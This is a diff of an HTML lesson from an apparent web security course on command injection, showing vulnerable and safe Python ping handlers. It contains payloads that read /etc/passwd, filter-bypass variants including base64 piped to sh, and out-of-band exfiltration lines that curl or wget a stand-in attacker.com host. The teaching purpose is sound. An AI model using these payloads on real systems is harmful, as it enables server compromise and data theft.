@@ -1,27 +1,25 @@
 <section class="module-header">
-  <h1>Module 18 — Command Injection</h1>
+  <h1>Module 14 — Command Injection</h1>
   <p>Learn how unsanitized input passed to OS commands enables attackers to execute arbitrary system commands.</p>
 </section>
 
 <section class="theory-section">
-  <h2>What Is Command Injection?</h2>
-  <p>Command injection occurs when an application passes user-controlled data to a system shell (e.g., via <code>os.popen()</code>, <code>os.system()</code>, or <code>subprocess.run(shell=True)</code>). Attackers inject shell metacharacters to chain additional commands.</p>
 
-  <h2>Shell Metacharacters</h2>
-  <div class="table-wrapper">
-    <table>
-      <thead><tr><th>Character</th><th>Meaning</th><th>Example</th></tr></thead>
-      <tbody>
-        <tr><td><code>;</code></td><td>Command separator</td><td><code>ping 8.8.8.8; cat /etc/passwd</code></td></tr>
-        <tr><td><code>|</code></td><td>Pipe output</td><td><code>ping 8.8.8.8 | cat /etc/passwd</code></td></tr>
-        <tr><td><code>&&</code></td><td>AND (run if first succeeds)</td><td><code>ping 8.8.8.8 && cat /etc/passwd</code></td></tr>
-        <tr><td><code>||</code></td><td>OR (run if first fails)</td><td><code>ping invalid || cat /etc/passwd</code></td></tr>
-        <tr><td><code>`cmd`</code></td><td>Backtick substitution</td><td><code>ping `cat /etc/passwd`</code></td></tr>
-        <tr><td><code>$(cmd)</code></td><td>Dollar substitution</td><td><code>ping $(cat /etc/passwd)</code></td></tr>
-        <tr><td><code>%0a</code></td><td>URL-encoded newline</td><td>Starts new command on next line</td></tr>
-      </tbody>
-    </table>
-  </div>
+  <h2>Direct Access to the Operating System</h2>
+  <p>
+    SQL injection gives you the database. XSS gives you the user's browser. But command injection? Command injection gives you <strong>the entire server</strong>. When an application passes user input to an operating system shell without proper sanitization, the attacker can execute any command the web server's user account can run.
+  </p>
+  <p>
+    Think about what that means. The attacker can read any file on the server. They can list processes. They can download and run malware. They can create new user accounts. They can pivot to other machines on the internal network. They can install a reverse shell and maintain persistent access long after the vulnerability is patched.
+  </p>
+  <p>
+    Command injection is one of the most severe vulnerability classes because <strong>there is no sandbox</strong>. SQL injection is limited to what SQL can do. XSS is limited to what JavaScript in a browser can do. Command injection is limited to what the operating system can do — which is everything.
+  </p>
+
+  <h2>How Command Injection Works</h2>
+  <p>
+    The vulnerability exists whenever an application takes user input and includes it in a string that gets executed as a shell command. The most common scenario is network tools — developers build a web interface for <code>ping</code>, <code>nslookup</code>, <code>traceroute</code>, or similar utilities and pass the user's input directly to the shell.
+  </p>
 
   <h3 class="text-red">Vulnerable Code</h3>
   <pre><code class="language-python">@app.route('/ping')
@@ -29,46 +27,134 @@ def ping():
     host = request.args.get('host')
     # DANGEROUS: user input directly in shell command
     output = os.popen(f'ping -c 1 {host}').read()
-    return output</code></pre>
+    return output
 
-  <h3 class="text-green">Safe Code</h3>
-  <pre><code class="language-python">import subprocess, shlex
+# Normal use: host=8.8.8.8
+# Command: ping -c 1 8.8.8.8  (works fine)
+
+# Attack:   host=8.8.8.8; cat /etc/passwd
+# Command:  ping -c 1 8.8.8.8; cat /etc/passwd
+# The semicolon ends the ping command and starts a new one!</code></pre>
+
+  <p>
+    The fundamental issue is the same as SQL injection: the shell receives one string and cannot tell where the developer's command ends and the user's input begins. The semicolon is interpreted as a command separator, and everything after it runs as a separate command.
+  </p>
+
+  <h2>Shell Metacharacters — The Attacker's Toolkit</h2>
+  <p>
+    The Unix shell has many special characters that control command execution. Each one is a potential injection vector:
+  </p>
+
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>Character</th><th>Meaning</th><th>Example</th></tr></thead>
+      <tbody>
+        <tr><td><code>;</code></td><td>Command separator — runs both commands</td><td><code>ping 8.8.8.8; cat /etc/passwd</code></td></tr>
+        <tr><td><code>|</code></td><td>Pipe — sends output of first to second</td><td><code>ping 8.8.8.8 | cat /etc/passwd</code></td></tr>
+        <tr><td><code>&&</code></td><td>AND — runs second only if first succeeds</td><td><code>ping 8.8.8.8 && cat /etc/passwd</code></td></tr>
+        <tr><td><code>||</code></td><td>OR — runs second only if first fails</td><td><code>ping invalid || cat /etc/passwd</code></td></tr>
+        <tr><td><code>`cmd`</code></td><td>Backtick substitution — executes inline</td><td><code>ping `whoami`.attacker.com</code></td></tr>
+        <tr><td><code>$(cmd)</code></td><td>Dollar substitution — same as backticks</td><td><code>ping $(whoami).attacker.com</code></td></tr>
+        <tr><td><code>%0a</code></td><td>URL-encoded newline — starts new line</td><td><code>host=8.8.8.8%0acat+/etc/passwd</code></td></tr>
+        <tr><td><code>></code> / <code>>></code></td><td>Redirect output to file</td><td><code>; id > /app/static/pwned.txt</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout callout-info">
+    <strong>Windows vs. Linux:</strong> On Windows, the metacharacters are slightly different. Use <code>&</code> instead of <code>;</code> as a command separator, and <code>|</code> works the same way. Windows-specific payloads: <code>& dir</code>, <code>| type C:\windows\win.ini</code>, <code>& whoami</code>.
+  </div>
+
+  <h3 class="text-green">Safe Code — No Shell Needed</h3>
+  <pre><code class="language-python">import subprocess
 
 @app.route('/ping')
 def ping():
     host = request.args.get('host')
-    # SAFE: pass as list (no shell interpretation)
+    # SAFE: pass as a list — no shell interpretation
+    # Each element is treated as a separate argument, not parsed by the shell
     result = subprocess.run(
         ['ping', '-c', '1', host],
         capture_output=True, text=True, timeout=5
     )
     return result.stdout</code></pre>
 
-  <h2>Filter Bypass Techniques</h2>
-  <pre><code class="language-bash"># Space bypass with $IFS (Internal Field Separator)
-cat${IFS}/etc/passwd
+  <p>
+    The key difference: when you pass a <strong>list</strong> to <code>subprocess.run()</code> without <code>shell=True</code>, the arguments are passed directly to the <code>ping</code> executable. No shell is involved, so shell metacharacters have no special meaning. Even if the user sends <code>8.8.8.8; cat /etc/passwd</code>, it is treated as a literal hostname (which will fail to resolve, but will not execute <code>cat</code>).
+  </p>
 
-# Space bypass with brace expansion
+  <h2>Filter Bypass Techniques</h2>
+  <p>
+    Many developers try to defend against command injection by blocking specific characters like spaces, semicolons, or pipe characters. These filters are almost always bypassable. The shell is an incredibly expressive language with dozens of ways to accomplish the same thing:
+  </p>
+
+  <pre><code class="language-bash"># === SPACE BYPASS ===
+# $IFS (Internal Field Separator) — default includes space, tab, newline
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+
+# Brace expansion — commas act as separators
 {cat,/etc/passwd}
 
-# Concatenation bypass
+# Tab character (hex 0x09)
+cat%09/etc/passwd
+
+# === KEYWORD BYPASS ===
+# Quote insertion — breaks up blocked words
 c''at /etc/passwd
 c\at /etc/passwd
+ca$()t /etc/passwd
 
-# Encoding bypass (URL-encoded newline)
-host=8.8.8.8%0acat%20/etc/passwd</code></pre>
+# Variable concatenation
+a=c;b=at;$a$b /etc/passwd
+
+# Base64 encoding
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
+
+# Hex encoding
+$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
+
+# Wildcard globbing
+cat /etc/pass??
+cat /etc/p*wd</code></pre>
+
+  <div class="callout callout-warning">
+    <strong>The Lesson:</strong> Blocklisting shell characters is a losing game. There are too many ways to bypass any filter. The only reliable defense is to <strong>avoid using the shell entirely</strong> — pass arguments as a list to <code>subprocess.run()</code> without <code>shell=True</code>. If you absolutely must use the shell, use <code>shlex.quote()</code> in Python to properly escape the input.
+  </div>
 
   <h2>Blind Command Injection</h2>
-  <p>When output is not displayed, detect injection via:</p>
-  <ul>
-    <li><strong>Time-based:</strong> <code>; sleep 5</code> — response delayed by 5 seconds</li>
-    <li><strong>Out-of-band:</strong> <code>; curl http://attacker.com/?data=$(cat /etc/passwd)</code></li>
-    <li><strong>File write:</strong> <code>; cat /secret > /app/static/output.txt</code></li>
-  </ul>
+  <p>
+    Sometimes the application executes your command but does not display the output. The server might just show "Ping complete" or return a generic success message. You cannot see the command's output, but you can still confirm injection and extract data through side channels:
+  </p>
+
+  <h3>Time-Based Detection</h3>
+  <pre><code class="language-bash"># If the response takes 5 extra seconds, injection worked
+; sleep 5
+| sleep 5
+`sleep 5`</code></pre>
+
+  <h3>Out-of-Band (OOB) Data Exfiltration</h3>
+  <pre><code class="language-bash"># DNS exfiltration — the data appears in your DNS logs
+; nslookup $(whoami).your-collaborator-domain.com
+; host $(cat /etc/hostname).your-server.com
+
+# HTTP exfiltration — the data arrives as a request to your server
+; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
+; wget http://attacker.com/$(whoami)</code></pre>
+
+  <h3>File Write Exfiltration</h3>
+  <pre><code class="language-bash"># Write output to a publicly accessible file
+; cat /app/secret.txt > /app/static/output.txt
+# Then browse to http://target.com/static/output.txt</code></pre>
+
+  <div class="callout callout-success">
+    <strong>Burp Collaborator / Interactsh:</strong> In real-world pentesting, OOB detection is made easy by tools like Burp Collaborator (built into Burp Suite Pro) or the open-source Interactsh. These tools give you a unique domain name and notify you instantly when any DNS or HTTP request arrives. This makes blind command injection detection reliable and fast.
+  </div>
 
   <div class="callout callout-danger">
-    <strong>Impact:</strong> Command injection gives attackers full OS-level access — they can read files, install backdoors, pivot to other systems, exfiltrate data, or wipe the server entirely.
+    <strong>Impact:</strong> Command injection gives attackers full OS-level access — they can read files, install backdoors, create reverse shells, pivot to internal networks, exfiltrate databases, mine cryptocurrency, or wipe the server entirely. It is consistently rated as Critical severity in bug bounty programs.
   </div>
+
 </section>
 
 <section class="quiz-section">
